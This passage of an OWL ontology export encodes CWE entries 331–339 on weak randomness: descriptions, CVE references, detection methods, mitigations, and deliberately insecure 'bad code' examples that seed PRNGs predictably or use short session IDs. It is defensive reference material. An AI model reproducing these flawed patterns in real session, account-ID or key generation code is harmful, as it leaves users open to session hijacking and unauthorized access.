Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.

This example also exhibits a Small Seed Space (CWE-339)."^^xsd:string, 
                 rdfs:comment "Example 2
The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.

(bad code)
Example Language: Java 
String GenerateReceiptURL(String baseUrl) {
Random ranGen = new Random();
ranGen.setSeed((new Date()).getTime());
return(baseUrl + ranGen.nextInt(400000000) + \".html\");
}
This code uses the Random.nextInt() function to generate \"unique\" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Man-in-the-middle attack tool
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Consider a PRNG that re-seeds itself as needed from high quality pseudo-random output sources, such as hardware devices."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "If software relies on unique, unguessable IDs to identify a resource, an attacker might be able to guess an ID for a resource that is owned by another user. The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application."^^xsd:string
                 
                 other  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "If software relies on unique, unguessable IDs to identify a resource, an attacker might be able to guess an ID for a resource that is owned by another user. The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application."^^xsd:string, 
                 rdfs:comment "When a protection mechanism relies on random values to restrict access to a sensitive resource, such as a session ID or a seed for generating a cryptographic key, then the resource being protected could be accessed by guessing the ID or key."^^xsd:string
                 
                 other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 requirements  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Focused Manual Spotcheck - Focused manual analysis of source
Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string, 
                 rdfs:comment "Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 testing  ""^^xsd:string
    
    
Individual: CWE-331_Insufficient_Entropy

    Annotations: 
        rdfs:comment "The software uses an algorithm or scheme that produces insufficient entropy, leaving patterns or clusters of values that are more likely to occur than others."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Insufficiently random data used to generate session tokens using C rand(). Also, for certificate/key generation, uses a source that does not block when entropy is low."^^xsd:string
                 
                 references  CVE-2001-0950,
     
     Annotations: rdfs:comment "Session Credential Falsification through Prediction"^^xsd:string
                 
                 related_attack_patterns  CAPEC-59,
     ID  "331"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could guess the random numbers generated and could gain unauthorized access to a system if the random numbers are used for authentication and authorization."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could guess the random numbers generated and could gain unauthorized access to a system if the random numbers are used for authentication and authorization."^^xsd:string
                 
                 access_control  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code generates a unique random identifier for a user's session.

(bad code)
Example Language: PHP 
function generateSessionID($userID){
srand($userID);
return rand();
}
Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.

This example also exhibits a Small Seed Space (CWE-339)."^^xsd:string, 
                 rdfs:comment "Example 2
The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.

(bad code)
Example Language: Java 
String GenerateReceiptURL(String baseUrl) {
Random ranGen = new Random();
ranGen.setSeed((new Date()).getTime());
return(baseUrl + ranGen.nextInt(400000000) + \".html\");
}
This code uses the Random.nextInt() function to generate \"unique\" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Determine the necessary entropy to adequately provide for randomness and predictability. This can be achieved by increasing the number of bits of objects such as keys and seeds."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could guess the random numbers generated and could gain unauthorized access to a system if the random numbers are used for authentication and authorization."^^xsd:string
                 
                 other  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could guess the random numbers generated and could gain unauthorized access to a system if the random numbers are used for authentication and authorization."^^xsd:string
                 
                 other  "Other"^^xsd:string
    
    
Individual: CWE-332_Insufficient_Entropy_in_PRNG

    Annotations: 
        rdfs:comment "The lack of entropy available for, or used by, a Pseudo-Random Number Generator (PRNG) can be a stability and security threat."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "332"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If a PRNG is using a limited entropy source which runs out, and the generator fails open, the generator could produce predictable random numbers. Potentially a weak source of random numbers could weaken the encryption method used for authentication of users."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "If a PRNG is using a limited entropy source which runs out, and the generator fails open, the generator could produce predictable random numbers. Potentially a weak source of random numbers could weaken the encryption method used for authentication of users."^^xsd:string
                 
                 access_control  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string, 
                 rdfs:comment "When deciding which PRNG to use, look at its sources of entropy. Depending on what your security needs are, you may need to use a random number generator that always uses strong random data -- i.e., a random number generator that attempts to be strong but will fail in a weak way or will always provide some middle ground of protection through techniques like re-seeding. Generally, something that always provides a predictable amount of strength is preferable."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "If a pseudo-random number generator is using a limited entropy source which runs out (if the generator fails closed), the program may pause or crash."^^xsd:string
                 
                 availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Consider a PRNG that re-seeds itself as needed from high-quality pseudo-random output, such as hardware devices."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "If a PRNG is using a limited entropy source which runs out, and the generator fails open, the generator could produce predictable random numbers. Potentially a weak source of random numbers could weaken the encryption method used for authentication of users."^^xsd:string
                 
                 other  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "If a PRNG is using a limited entropy source which runs out, and the generator fails open, the generator could produce predictable random numbers. Potentially a weak source of random numbers could weaken the encryption method used for authentication of users."^^xsd:string
                 
                 other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-333_Improper_Handling_of_Insufficient_Entropy_in_TRNG

    Annotations: 
        rdfs:comment "The rate at which true random numbers can be generated is limited. It is important that one uses them only when they are needed for security."^^xsd:string,
        rdfs:comment "True random number generators (TRNG) generally have a limited source of entropy and therefore can fail or block."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "333"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "A program may crash or block if it runs out of random numbers."^^xsd:string
                 
                 availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "This code uses a TRNG to generate a unique session id for new connections to a server:

(bad code)
Example Language: C 
while (1){
if (haveNewConnection()){
if (hwRandom()){
int sessionID = hwRandom();
createNewConnection(sessionID);
} } }
This code does not attempt to limit the number of new connections or make sure the TRNG can successfully generate a new random number. An attacker may be able to create many new connections and exhaust the entropy of the TRNG. The TRNG may then block and cause the program to crash or hang."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Rather than failing on a lack of random numbers, it is often preferable to wait for more numbers to be created."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-334_Small_Space_of_Random_Values

    Annotations: 
        rdfs:comment "The number of possible random values is smaller than needed by the product, making it more susceptible to brute force attacks."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Product uses 5 alphanumeric characters for filenames of expense claim reports, stored under web root."^^xsd:string
                 
                 references  CVE-2002-0583,
     
     Annotations: rdfs:comment "Product uses small number of random numbers for a code to approve an action, and also uses predictable new user IDs, allowing attackers to hijack new accounts."^^xsd:string
                 
                 references  CVE-2002-0903,
     
     Annotations: rdfs:comment "SYN cookies implementation only uses 32-bit keys, making it easier to brute force ISN."^^xsd:string
                 
                 references  CVE-2003-1230,
     
     Annotations: rdfs:comment "Complex predictability / randomness (reduced space)."^^xsd:string
                 
                 references  CVE-2004-0230,
     ID  "334"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could easily guess the values used. This could lead to unauthorized access to a system if the seed is used for authentication and authorization."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could easily guess the values used. This could lead to unauthorized access to a system if the seed is used for authentication and authorization."^^xsd:string
                 
                 access_control  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following XML example code is a deployment descriptor for a Java web application deployed on a Sun Java Application Server. This deployment descriptor includes a session configuration property for configuring the session ID length.

(bad code)
Example Language: XML 
<sun-web-app>
...
<session-config>
<session-properties>
<property name=\"idLengthBytes\" value=\"8\">
<description>The number of bytes in this web module's session ID.</description>
</property>
</session-properties>
</session-config>
...
</sun-web-app>
This deployment descriptor has set the session ID length for this Java web application to 8 bytes (or 64 bits). The session ID length for Java web applications should be set to 16 bytes (128 bits) to prevent attackers from guessing and/or stealing a session ID and taking over a user's session.

Note for most application servers including the Sun Java Application Server the session ID length is by default set to 128 bits and should not be changed. And for many application servers the session ID length cannot be changed from this default setting. Check your application server documentation for the session ID length default setting and configuration options to ensure that the session ID length is set to 128 bits."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could easily guess the values used. This could lead to unauthorized access to a system if the seed is used for authentication and authorization."^^xsd:string
                 
                 other  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could easily guess the values used. This could lead to unauthorized access to a system if the seed is used for authentication and authorization."^^xsd:string
                 
                 other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-335_Incorrect_Usage_of_Seeds_in_Pseudo-Random_Number_Generator_PRNG

    Annotations: 
        rdfs:comment "The software uses a Pseudo-Random Number Generator (PRNG) that does not correctly manage seeds."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "335"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "if a PRNG is used incorrectly, such as using the same seed for each initialization or using a predictable seed, then an attacker may be able to easily guess the seed and thus the random numbers. This could lead to unauthorized access to a system if the seed is used for authentication and authorization."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "if a PRNG is used incorrectly, such as using the same seed for each initialization or using a predictable seed, then an attacker may be able to easily guess the seed and thus the random numbers. This could lead to unauthorized access to a system if the seed is used for authentication and authorization."^^xsd:string
                 
                 access_control  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "if a PRNG is used incorrectly, such as using the same seed for each initialization or using a predictable seed, then an attacker may be able to easily guess the seed and thus the random numbers. This could lead to unauthorized access to a system if the seed is used for authentication and authorization."^^xsd:string
                 
                 other  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "if a PRNG is used incorrectly, such as using the same seed for each initialization or using a predictable seed, then an attacker may be able to easily guess the seed and thus the random numbers. This could lead to unauthorized access to a system if the seed is used for authentication and authorization."^^xsd:string
                 
                 other  "Other"^^xsd:string
    
    
Individual: CWE-336_Same_Seed_in_Pseudo-Random_Number_Generator

    Annotations: 
        rdfs:comment "A Pseudo-Random Number Generator (PRNG) uses the same seed each time the product is initialized."^^xsd:string,
        rdfs:comment "If an attacker can guess (or knows) the seed, then the attacker may be able to determine the random numbers that will be produced from the PRNG."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "336"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not reuse PRNG seeds. Consider a PRNG that periodically re-seeds itself as needed from a high quality pseudo-random output, such as hardware devices."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following code uses a statistical PRNG to generate account IDs.

(bad code)
Example Language: Java 
private static final long SEED = 1234567890;
public int generateAccountID() {
Random random = new Random(SEED);
return random.nextInt();
}
Because the program uses the same seed value for every invocation of the PRNG, its values are predictable, making the system vulnerable to attack."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Bypass Protection Mechanism"^^xsd:string,
     other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-337_Predictable_Seed_in_Pseudo-Random_Number_Generator

    Annotations: 
        rdfs:comment "A Pseudo-Random Number Generator (PRNG) is initialized from a predictable seed, such as the process ID or system time."^^xsd:string,
        rdfs:comment "Potential Mitigations:
Use non-predictable inputs for seed generation."^^xsd:string,
        rdfs:comment "The use of predictable seeds significantly reduces the number of possible seeds that an attacker would need to test in order to predict which random numnbers will be generated by the PRNG."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "337"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number:

(bad code)
Example Language: Java 
Random random = new Random(System.currentTimeMillis());
int accountID = random.nextInt();
(bad code)
Example Language: C 
srand(time());
int randNum = rand();
An attacker can easily predict the seed used by these PRNGs, and so also predict the stream of random numbers generated. Note these examples also exhibit CWE-338 (Use of Cryptographically Weak PRNG)."^^xsd:string
                 
                 other  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (\"Approved Random Number Generators\")."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-338_Use_of_Cryptographically_Weak_Pseudo-Random_Number_Generator

    Annotations: 
        rdfs:comment "The product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong."^^xsd:string,
        rdfs:comment "When a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks.

Often a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a mediocre source of randomness is sufficient or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "SSL library uses a weak random number generator that only generates 65,536 unique keys."^^xsd:string
                 
                 references  CVE-2008-0166,
     
     Annotations: rdfs:comment "Web application generates predictable session IDs, allowing session hijacking."^^xsd:string
                 
                 references  CVE-2009-2367,
     
     Annotations: rdfs:comment "Random number generator can repeatedly generate the same value."^^xsd:string
                 
                 references  CVE-2009-3238,
     
     Annotations: rdfs:comment "Crypto product uses rand() library function to generate a recovery key, making it easier to conduct brute force attacks."^^xsd:string
                 
                 references  CVE-2009-3278,
     ID  "338"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If a PRNG is used for authentication and authorization, such as a session ID or a seed for generating a cryptographic key, then an attacker may be able to easily guess the ID or cryptographic key and gain access to restricted functionality."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
Both of these examples use a statistical PRNG to generate a random number:

(bad code)
Example Language: Java 
Random random = new Random(System.currentTimeMillis());
int accountID = random.nextInt();
(bad code)
Example Language: C 
srand(time());
int randNum = rand();
The random number functions used in these examples, rand() and Random.nextInt(), are not considered cryptographically strong. An attacker may be able to predict the random numbers generated by these functions. Note that these example also exhibit CWE-337 (Predictable Seed in PRNG)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use functions or hardware which use a hardware-based random number generation for all crypto. This is the recommended solution. Use CyptGenRandom on Windows, or hw_rand() on Linux."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-339_Small_Seed_Space_in_PRNG

    Annotations: 
        rdfs:comment "A PRNG uses a relatively small space of seeds."^^xsd:string,
        rdfs:comment "Maintenance:
This entry overlaps predictable from observable state (CWE-341)."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "339"^^xsd:positiveInteger,
     
